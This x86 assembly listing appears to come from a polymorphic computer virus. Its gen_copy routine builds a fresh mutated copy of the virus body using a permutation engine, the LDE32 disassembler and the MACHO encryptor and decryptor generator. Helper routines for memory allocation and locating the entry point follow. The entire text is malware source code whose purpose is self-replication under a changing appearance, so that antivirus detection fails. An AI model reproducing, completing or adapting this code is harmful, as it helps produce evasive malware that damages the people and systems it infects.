

; generate new polymorphic copy (call MACHO & RPME)

; resulting buffer    -- buf
; size                -- buf_size
; relative entrypoint -- buf_entry

gen_copy:               pusha
                        cld

                        seh_init

                        push    offset ldetbl   ; initialize LDE32
                        call    disasm_init     ; LDE32BIN.INC

                        mov     mem_count, 0    ; for my_malloc

                        mov     buf_size, CODESIZE
;;
                        call1   my_rnd, 5
                        mov     use_macho, al
                        pop     eax
                        cmp     use_macho, 0
                        jne     __1
                        sub     patch_start, M_C1+M_C2
__1:
;;

                        ; randomize buffer
                        mov     edi, buf_ptr
                        mov     ecx, buf_size
__fillbuf:              call1   my_rnd, 256
                        add     esp, 4
                        xor     al, cl
                        stosb
                        loop    __fillbuf


                        call    get_entrypoint
                        ; EAX=entrypoint

                        pusho   my_malloc       ; malloc
                        pusho   my_disasm       ; disasm opcode
                        pusho   my_mutate       ; see usermut.inc
                        pusho   my_rnd          ; randomer
                        push    0               ; jmp-prob   <--  0==NO JMPS
                        push    0               ; extrelfix
                        push    -1              ; ofiller (-1=xparent)
                        push    0               ; *oentry     <-- ==0
                        push    buf_size        ; osize
                        push    buf_ptr         ; obuf
                        push    eax             ; ientry
                        push    CODESIZE        ; isize
                        push    offset start    ; ibuf
                        call    engine

                        or      eax, eax
                        jnz     __error

                        mov     edi, out_ptr
                        mov     ecx, INFILESIZE
                        mov     out_size, ecx
                        xor     eax, eax
                        rep     stosb
                        mov     out_entry, ecx

                        add     buf_size, 3
                        and     buf_size, not 3

                        cmp     use_macho, 0
                        jne     __use_macho

__skip_macho:           mov     esi, buf_ptr
                        mov     edi, out_ptr
                        mov     ecx, buf_size
                        rep     movsb

                        jmp     __end_macho

__use_macho:
                        mov     edi, out_ptr

                        push    11001111b    ; regfree
                        push    edi          ; decryptorptr
                        push    0            ; decryptorsizeptr
                        push    offset m_encr  ; encryptorptr
                        mov     eax, macho_start
                        add     eax, M_C1
                        push    eax          ; virinput
                        add     eax, M_C2
                        push    eax          ; viroutput
                        push    0            ; virentry (rel. to viroutput)
                        push    buf_size     ; virsize
                        mov     eax, macho_start
                        add     eax, INFILESIZE-M_C3
                        push    eax          ; varstart
                        push    M_C3         ; varsize
                        call    macho

                        mov     esi, buf_ptr
                        mov     edi, out_ptr
                        add     edi, M_C1
                        mov     ecx, buf_size
                        lea     eax, m_encr
                        call    eax          ; macho::encrypt
__end_macho:
                        nop
                        nop

                        clc

__exit:                 seh_done

                        popa
                        ret

__error:                stc
;                       int 3
;                       int 3
;                       int 3
                        jmp     __exit

; cdecl BYTE* malloc(DWORD size)

my_malloc:              mov     eax, [esp+4]
                        add     eax, mem_count
                        cmp     eax, MAXMEM
                        jae     __error
                        xchg    mem_count, eax
                        add     eax, mem_ptr
                        ret
__error:                xor     eax, eax
                        ret

; LDE32 interface
; cdecl int disasm(BYTE* opcode)

my_disasm:              push    dword ptr [esp+4]
                        push    offset ldetbl
                        call    disasm_main             ; LDE32BIN.INC
                        ret

; ---------------------------------------------------------------------------

get_entrypoint:         pusho   init
                        pop     eax
                        sub     eax, offset start
                        retn
